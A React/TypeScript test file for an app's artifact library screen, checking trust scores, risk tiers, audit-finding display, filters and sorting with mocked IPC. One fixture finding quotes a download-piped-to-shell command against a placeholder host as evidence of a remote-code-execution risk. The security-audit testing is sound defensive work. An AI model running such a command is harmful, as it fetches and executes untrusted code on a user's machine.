import { mockIPC } from "@tauri-apps/api/mocks";
import { render, screen, waitFor, within } from "@testing-library/react";
import userEvent from "@testing-library/user-event";
import { fireEvent } from "@testing-library/react";
import { MemoryRouter, Route, Routes, useLocation } from "react-router";
import { describe, expect, it } from "vitest";
import type { ArtifactDetail } from "../../bindings/ArtifactDetail";
import type { Audit } from "../../bindings/Audit";
import type { Query } from "../../bindings/Query";
import { item, page } from "../../test/library";
import { LibraryScreen } from ".";
import { parseParams, toSearchParams } from "./params";

const items = [
  item("alpha", { trustScore: 92, tier: "trusted", findingCount: 0 }),
  item("beta", { trustScore: 35, tier: "risky", findingCount: 2 }),
  item("gamma"),
];

const audit: Audit = {
  score: 35,
  tier: "risky",
  findings: [
    {
      rule: "rce",
      severity: "critical",
      message: "Pipes a download into a shell",
      file: "beta/SKILL.md",
      line: 12,
      evidence: "curl https://x.test | sh",
    },
    {
      rule: "unpinned-package",
      severity: "low",
      message: "Runs an unpinned package",
      file: ".mcp.json#srv",
      line: null,
      evidence: "npx tool",
    },
  ],
  reach: { files: [], network: ["x.test"], shell: ["curl"], env: ["API_NAME"] },
};

function detail(name: string, a: Audit | null): ArtifactDetail {
  return {
    id: `id-${name}`,
    artifact: {
      kind: "skill",
      name,
      description: null,
      path: name,
      files: [],
      metadata: {},
      references: [],
      diagnostics: [],
      digest: null,
      origin: { type: "own" },
    },
    audit: a,
    auditedAt: a ? 1_700_000_000n : null,
    links: { needs: [], neededBy: [] },
    provenance: {
      source: {
        id: "s1",
        kind: "local",
        location: "/kit",
        branch: null,
        subfolder: null,
        commitSha: null,
      },
      sourcePath: name,
      digest: null,
      importedAt: 1_700_000_000n,
      replacedSecretKeys: [],
    },
    files: [],
  };
}

function Probe() {
  return <span data-testid="search">{useLocation().search}</span>;
}

function setup(path = "/library") {
  const queries: Query[] = [];
  mockIPC((cmd, args) => {
    const a = (args ?? {}) as Record<string, unknown>;
    switch (cmd) {
      case "library_list":
        queries.push(a.query as Query);
        return page(items, {
          facets: {
            withFindings: 1,
            outdated: 0,
            kinds: [],
            tags: [],
            sources: [],
            tiers: [
              { tier: "trusted", count: 1 },
              { tier: "risky", count: 1 },
            ],
          },
        });
      case "library_detail":
        return a.id === "id-beta"
          ? detail("beta", audit)
          : detail(String(a.id).slice(3), null);
      case "tags_list":
      case "artifact_tags":
        return [];
      default:
        return undefined;
    }
  });
  render(
    <MemoryRouter initialEntries={[path]}>
      <Probe />
      <Routes>
        <Route path="/library" element={<LibraryScreen />} />
      </Routes>
    </MemoryRouter>,
  );
  return queries;
}

describe("trust params", () => {
  it("round-trips through the URL and ignores junk", () => {
    const p = parseParams(
      new URLSearchParams(
        "trust=60&tier=risky&tier=bogus&findings=1&sort=trust&dir=desc",
      ),
    );
    expect(p.trustMin).toBe(60);
    expect(p.tiers).toEqual(["risky"]);
    expect(p.hasFindings).toBe(true);
    expect(p.sort).toBe("trust");
    const sp = toSearchParams(p).toString();
    expect(sp).toContain("trust=60");
    expect(sp).toContain("tier=risky");
    expect(sp).toContain("findings=1");
    expect(parseParams(new URLSearchParams("trust=0")).trustMin).toBeNull();
  });
});

describe("trust in the library", () => {
  it("shows a meter per card and Not audited when there is no audit", async () => {
    setup();
    const alpha = (await screen.findByText("alpha")).closest("button");
    expect(alpha).not.toBeNull();
    expect(within(alpha as HTMLElement).getByText("92")).toBeInTheDocument();
    const gamma = screen.getByText("gamma").closest("button");
    expect(
      within(gamma as HTMLElement).getByText("Not audited"),
    ).toBeInTheDocument();
  });

  it("filters by minimum score, tier and findings, with chips and URL params", async () => {
    const user = userEvent.setup();
    const queries = setup();
    await screen.findByText("alpha");
    fireEvent.change(screen.getByLabelText("Minimum trust score"), {
      target: { value: "60" },
    });
    await screen.findByRole("button", { name: "Remove filter Trust ≥ 60" });
    const filters = within(
      screen.getByRole("complementary", { name: "Filters" }),
    );
    await user.click(filters.getByRole("button", { name: /Risky/ }));
    await user.click(filters.getByRole("button", { name: /Has findings/ }));
    await waitFor(() => {
      const q = queries.at(-1);
      expect(q?.filter.trustMin).toBe(60);
      expect(q?.filter.tiers).toEqual(["risky"]);
      expect(q?.filter.hasFindings).toBe(true);
    });
    const search = screen.getByTestId("search").textContent ?? "";
    expect(search).toContain("trust=60");
    expect(search).toContain("tier=risky");
    expect(search).toContain("findings=1");
    await user.click(
      screen.getByRole("button", { name: "Remove filter Has findings" }),
    );
    await waitFor(() => expect(queries.at(-1)?.filter.hasFindings).toBe(false));
  });

  it("sorts by trust from the chips and the list column", async () => {
    const user = userEvent.setup();
    const queries = setup("/library?view=list");
    await screen.findByText("alpha");
    await user.click(screen.getByRole("button", { name: "Trust" }));
    await waitFor(() => {
      expect(queries.at(-1)?.sort).toBe("trust");
      expect(queries.at(-1)?.descending).toBe(true);
    });
    expect(screen.getByTestId("search")).toHaveTextContent(
      "sort=trust&dir=desc",
    );
  });
});

describe("trust in the detail panel", () => {
  it("shows findings by severity with evidence, and the reach rows", async () => {
    setup("/library?open=id-beta");
    const panel = await screen.findByRole("dialog", { name: "beta details" });
    expect(await within(panel).findByText("Critical (1)")).toBeInTheDocument();
    expect(within(panel).getByText("Low (1)")).toBeInTheDocument();
    expect(within(panel).getByText("rce")).toBeInTheDocument();
    expect(within(panel).getByText("beta/SKILL.md:12")).toBeInTheDocument();
    expect(within(panel).getByText(".mcp.json#srv")).toBeInTheDocument();
    expect(
      within(panel).getByText("curl https://x.test | sh"),
    ).toBeInTheDocument();
    expect(within(panel).getByText("Risky")).toBeInTheDocument();
    expect(within(panel).getByText("x.test")).toBeInTheDocument();
    expect(within(panel).getByText("curl")).toBeInTheDocument();
    expect(within(panel).getByText("API_NAME")).toBeInTheDocument();
  });

  it("says so when the artifact was never audited", async () => {
    setup("/library?open=id-gamma");
    const panel = await screen.findByRole("dialog", { name: "gamma details" });
    expect(
      await within(panel).findByText(/Not audited yet/),
    ).toBeInTheDocument();
  });

  it("moves focus to the Trust heading for focus=trust", async () => {
    setup("/library?open=id-beta&focus=trust");
    const panel = await screen.findByRole("dialog", { name: "beta details" });
    await within(panel).findByText("Critical (1)");
    await waitFor(() =>
      expect(
        within(panel).getByRole("heading", { name: /^Trust/ }),
      ).toHaveFocus(),
    );
  });

  it("links the not-audited copy to Security", async () => {
    setup("/library?open=id-gamma");
    const panel = await screen.findByRole("dialog", { name: "gamma details" });
    expect(
      await within(panel).findByRole("link", { name: "open Security" }),
    ).toHaveAttribute("href", "/security");
  });
});

describe("dangerous artifacts stand out", () => {
  it("shows the tier word and the finding count on a risky card, only the bar on trusted", async () => {
    setup();
    const beta = (await screen.findByText("beta")).closest("button");
    const inBeta = within(beta as HTMLElement);
    expect(inBeta.getByText("2 findings")).toBeInTheDocument();
    expect(inBeta.getByText("Risky")).toBeInTheDocument();
    const alpha = screen.getByText("alpha").closest("button");
    expect(within(alpha as HTMLElement).queryByText(/finding/)).toBeNull();
  });

  it("marks a dangerous card with its tier for the red treatment", async () => {
    mockIPC((cmd) =>
      cmd === "library_list"
        ? page([
            item("bad", { trustScore: 10, tier: "dangerous", findingCount: 1 }),
          ])
        : undefined,
    );
    render(
      <MemoryRouter initialEntries={["/library"]}>
        <Routes>
          <Route path="/library" element={<LibraryScreen />} />
        </Routes>
      </MemoryRouter>,
    );
    const card = (await screen.findByText("bad")).closest("button");
    expect(card).toHaveAttribute("data-tier", "dangerous");
    expect(
      within(card as HTMLElement).getByText("1 finding"),
    ).toBeInTheDocument();
  });
});

describe("trust filter group", () => {
  it("sits right after Type, and Has findings shows its count", async () => {
    setup();
    await screen.findByText("alpha");
    const filters = screen.getByRole("complementary", { name: "Filters" });
    const heads = within(filters)
      .getAllByRole("heading", { level: 3 })
      .map((h) => h.textContent);
    expect(heads.slice(0, 2)).toEqual(["Type", "Trust"]);
    expect(
      within(filters).getByRole("button", { name: /Has findings/ }),
    ).toHaveTextContent("1");
  });

  it("says so when the slider rules out a ticked tier", async () => {
    setup("/library?trust=80&tier=risky");
    expect(
      await screen.findByText(/Trust ≥ 80 rules out Risky/),
    ).toBeInTheDocument();
  });

  it("offers Worst first: trust ascending", async () => {
    const user = userEvent.setup();
    const queries = setup();
    await screen.findByText("alpha");
    await user.click(screen.getByRole("button", { name: "Worst first" }));
    await waitFor(() => {
      expect(queries.at(-1)?.sort).toBe("trust");
      expect(queries.at(-1)?.descending).toBe(false);
    });
  });
});
